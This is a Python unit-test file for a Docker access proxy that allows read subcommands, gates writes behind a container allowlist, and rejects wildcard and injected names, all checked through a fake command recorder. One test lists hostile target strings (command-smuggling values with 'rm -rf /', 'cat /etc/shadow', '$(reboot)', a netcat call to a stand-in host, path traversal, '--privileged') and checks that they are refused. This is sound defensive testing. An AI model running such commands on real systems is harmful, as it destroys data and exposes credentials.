"""Unit tests for docker-proxy. No real Docker and no network: every docker invocation goes through a fake
`run` recorder instead of subprocess.run (same technique as the rest of this repo's hook tests: replace the one
side-effecting call with a fake, assert on what it would have run). The end-to-end test below opens a real Unix
socket on a local tmp path, which is not network access.
"""
import json, os, socket, subprocess, sys, tempfile, threading, unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import docker_proxyd as dp


class FakeRun:
    """Stand-in for subprocess.run: records every argv it was called with instead of running anything."""

    def __init__(self, returncode=0, stdout="ok\n", stderr=""):
        self.calls = []
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = stderr

    def __call__(self, argv, **kwargs):
        self.calls.append(argv)
        return subprocess.CompletedProcess(argv, self.returncode, self.stdout, self.stderr)


def cfg(containers=()):
    return {"write_allow_containers": set(containers)}


class ReadAlwaysAllowed(unittest.TestCase):
    def test_ps(self):
        allowed, reason, argv = dp.decide({"subcommand": "ps"}, cfg())
        self.assertTrue(allowed)
        self.assertEqual(argv, ["docker", "ps"])

    def test_ps_all_flag(self):
        allowed, reason, argv = dp.decide({"subcommand": "ps", "all": True}, cfg())
        self.assertEqual(argv, ["docker", "ps", "-a"])

    def test_ps_rejects_target(self):
        allowed, reason, argv = dp.decide({"subcommand": "ps", "target": "x"}, cfg())
        self.assertFalse(allowed)

    def test_logs_inspect_stats_top_on_empty_allowlist(self):
        # Reads never consult write_allow_containers at all -- they are allowed on a container the config knows
        # nothing about, because read access is unconditional, not whitelist-gated.
        for sub in ("logs", "inspect", "stats", "top"):
            allowed, reason, argv = dp.decide({"subcommand": sub, "target": "anything-not-listed"}, cfg())
            self.assertTrue(allowed, f"{sub} should be allowed regardless of the write allowlist")
            self.assertIn("anything-not-listed", argv)

    def test_stats_always_gets_no_stream(self):
        _, _, argv = dp.decide({"subcommand": "stats", "target": "web"}, cfg())
        self.assertIn("--no-stream", argv)

    def test_logs_tail_bounds(self):
        allowed, _, argv = dp.decide({"subcommand": "logs", "target": "web", "tail": 50}, cfg())
        self.assertTrue(allowed)
        self.assertIn("--tail", argv)
        allowed, _, _ = dp.decide({"subcommand": "logs", "target": "web", "tail": -1}, cfg())
        self.assertFalse(allowed)
        allowed, _, _ = dp.decide({"subcommand": "logs", "target": "web", "tail": dp.MAX_TAIL + 1}, cfg())
        self.assertFalse(allowed)
        allowed, _, _ = dp.decide({"subcommand": "logs", "target": "web", "tail": True}, cfg())
        self.assertFalse(allowed, "bool must not be accepted where an int is expected")


class WriteGatedByAllowlist(unittest.TestCase):
    def test_restart_on_whitelisted_container_allowed(self):
        allowed, reason, argv = dp.decide({"subcommand": "restart", "target": "web"}, cfg(["web"]))
        self.assertTrue(allowed)
        self.assertEqual(argv, ["docker", "restart", "web"])

    def test_restart_on_non_whitelisted_container_refused(self):
        allowed, reason, argv = dp.decide({"subcommand": "restart", "target": "db"}, cfg(["web"]))
        self.assertFalse(allowed)
        self.assertIsNone(argv)
        self.assertIn("not in write allowlist", reason)

    def test_start_and_stop_also_gated(self):
        for sub in ("start", "stop"):
            allowed, _, _ = dp.decide({"subcommand": sub, "target": "db"}, cfg(["web"]))
            self.assertFalse(allowed)
            allowed, _, _ = dp.decide({"subcommand": sub, "target": "web"}, cfg(["web"]))
            self.assertTrue(allowed)

    def test_stop_timeout_bounds(self):
        allowed, _, argv = dp.decide({"subcommand": "stop", "target": "web", "timeout": 5}, cfg(["web"]))
        self.assertTrue(allowed)
        self.assertIn("-t", argv)
        allowed, _, _ = dp.decide({"subcommand": "stop", "target": "web", "timeout": 99999}, cfg(["web"]))
        self.assertFalse(allowed)

    def test_start_has_no_timeout_option(self):
        # start's parser (client side) has no --timeout; server-side decide() also ignores it for "start" --
        # a timeout key there is simply not consulted, not an error, which is fine since write-start never builds -t.
        allowed, _, argv = dp.decide({"subcommand": "start", "target": "web", "timeout": 5}, cfg(["web"]))
        self.assertTrue(allowed)
        self.assertNotIn("-t", argv)


class UnknownSubcommandRefused(unittest.TestCase):
    def test_unknown(self):
        for sub in ("exec", "run", "rm", "create", "compose", "", None, "PS"):
            allowed, reason, argv = dp.decide({"subcommand": sub, "target": "web"}, cfg(["web"]))
            self.assertFalse(allowed, f"{sub!r} must be refused")
            self.assertIsNone(argv)

    def test_non_dict_request(self):
        allowed, reason, argv = dp.decide("not-a-dict", cfg())
        self.assertFalse(allowed)


class WildcardAndInjectionRefused(unittest.TestCase):
    def test_wildcard_target_refused_for_read(self):
        for bad in ("*", "web*", "?web", "web?", "[web]", "web db", ""):
            allowed, reason, argv = dp.decide({"subcommand": "logs", "target": bad}, cfg())
            self.assertFalse(allowed, f"{bad!r} must be refused")

    def test_wildcard_target_refused_for_write_even_if_listed_literally(self):
        # The literal string "*" itself could in principle be "whitelisted"; NAME_RE must still refuse it before
        # the whitelist check is ever consulted.
        allowed, reason, argv = dp.decide({"subcommand": "restart", "target": "*"}, cfg(["*"]))
        self.assertFalse(allowed)

    def test_shell_metacharacter_injection_in_target_refused(self):
        payloads = [
            "web; rm -rf /",
            "web && cat /etc/shadow",
            "web`id`",
            "$(reboot)",
            "web|nc evil 1234",
            "web\nrm -rf /",
            "../../etc/passwd",
            "-v",                      # flag-injection attempt: looks like a docker option, not a name
            "--privileged",
        ]
        for bad in payloads:
            allowed, reason, argv = dp.decide({"subcommand": "restart", "target": bad}, cfg([bad]))
            self.assertFalse(allowed, f"{bad!r} must be refused even if present in the allowlist")
            allowed, reason, argv = dp.decide({"subcommand": "logs", "target": bad}, cfg())
            self.assertFalse(allowed, f"{bad!r} must be refused for reads too")


class ConfigLoading(unittest.TestCase):
    def _write(self, data):
        fd, path = tempfile.mkstemp(suffix=".json")
        with os.fdopen(fd, "w") as f:
            json.dump(data, f)
        self.addCleanup(os.remove, path)
        return path

    def test_valid_config_loads(self):
        path = self._write({"write_allow": {"containers": ["web", "worker-1"]}})
        config = dp.load_config(path)
        self.assertEqual(config["write_allow_containers"], {"web", "worker-1"})

    def test_missing_section_defaults_to_empty(self):
        path = self._write({})
        config = dp.load_config(path)
        self.assertEqual(config["write_allow_containers"], set())

    def test_wildcard_in_config_refused(self):
        for bad in ["*", "web*", "web?", "[a-z]+", ".*", "web db"]:
            path = self._write({"write_allow": {"containers": ["web", bad]}})
            with self.assertRaises(ValueError, msg=f"{bad!r} should make load_config refuse to start"):
                dp.load_config(path)

    def test_non_string_entry_refused(self):
        path = self._write({"write_allow": {"containers": ["web", 123]}})
        with self.assertRaises(ValueError):
            dp.load_config(path)

    def test_non_list_refused(self):
        path = self._write({"write_allow": {"containers": "web"}})
        with self.assertRaises(ValueError):
            dp.load_config(path)


class HandleRequestUsesInjectedRun(unittest.TestCase):
    def test_allowed_write_calls_run_with_exact_argv(self):
        run = FakeRun(returncode=0, stdout="restarted\n")
        resp = dp.handle_request({"subcommand": "restart", "target": "web"}, cfg(["web"]), run=run)
        self.assertTrue(resp["ok"])
        self.assertEqual(run.calls, [["docker", "restart", "web"]])
        self.assertEqual(resp["stdout"], "restarted\n")

    def test_refused_request_never_calls_run(self):
        run = FakeRun()
        resp = dp.handle_request({"subcommand": "restart", "target": "db"}, cfg(["web"]), run=run)
        self.assertFalse(resp["ok"])
        self.assertEqual(run.calls, [], "a refused request must never reach subprocess")

    def test_docker_failure_is_surfaced_not_raised(self):
        run = FakeRun(returncode=1, stdout="", stderr="no such container\n")
        resp = dp.handle_request({"subcommand": "logs", "target": "ghost"}, cfg(), run=run)
        self.assertTrue(resp["ok"])          # the proxy allowed the call; docker itself failed
        self.assertEqual(resp["returncode"], 1)


class MutationGuardIsLoadBearing(unittest.TestCase):
    """If is_whitelisted() is disabled (reverted to "allow everything"), a write on a non-whitelisted container
    must flip from refused to allowed. If this test fails after such a change, the real guard was not doing
    anything -- which is exactly what it's meant to catch."""

    def test_disabling_the_whitelist_check_changes_the_outcome(self):
        req = {"subcommand": "restart", "target": "not-listed"}
        config = cfg(["web"])

        allowed_before, _, _ = dp.decide(req, config)
        self.assertFalse(allowed_before, "sanity check: the real guard must refuse this today")

        original = dp.is_whitelisted
        dp.is_whitelisted = lambda target, config: True
        try:
            allowed_after, _, _ = dp.decide(req, config)
        finally:
            dp.is_whitelisted = original

        self.assertTrue(
            allowed_after,
            "mutating is_whitelisted() to always allow had no effect -- decide() is not actually calling it",
        )


class EndToEndOverRealSocket(unittest.TestCase):
    """Real Unix domain socket on a local tmp path (not network), real ProxyServer, fake docker run."""

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.sock_path = os.path.join(self.tmpdir, "docker-proxy.sock")
        self.run = FakeRun(returncode=0, stdout="hi\n")
        self.server = dp.ProxyServer(self.sock_path, cfg(["web"]), run=self.run)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        self.addCleanup(self._shutdown)

    def _shutdown(self):
        self.server.shutdown()
        self.server.server_close()

    def _ask(self, req):
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect(self.sock_path)
        s.sendall((json.dumps(req) + "\n").encode())
        buf = b""
        while not buf.endswith(b"\n"):
            chunk = s.recv(65536)
            if not chunk:
                break
            buf += chunk
        s.close()
        return json.loads(buf)

    def test_allowed_write_round_trips(self):
        resp = self._ask({"subcommand": "restart", "target": "web"})
        self.assertTrue(resp["ok"])
        self.assertEqual(self.run.calls, [["docker", "restart", "web"]])

    def test_refused_write_round_trips(self):
        resp = self._ask({"subcommand": "restart", "target": "db"})
        self.assertFalse(resp["ok"])
        self.assertEqual(self.run.calls, [])

    def test_malformed_json_is_refused_not_crashing(self):
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect(self.sock_path)
        s.sendall(b"{not json\n")
        buf = s.recv(65536)
        s.close()
        resp = json.loads(buf)
        self.assertFalse(resp["ok"])

    def test_socket_permissions_are_not_world_writable(self):
        mode = os.stat(self.sock_path).st_mode & 0o777
        self.assertEqual(mode, 0o660)


if __name__ == "__main__":
    unittest.main()
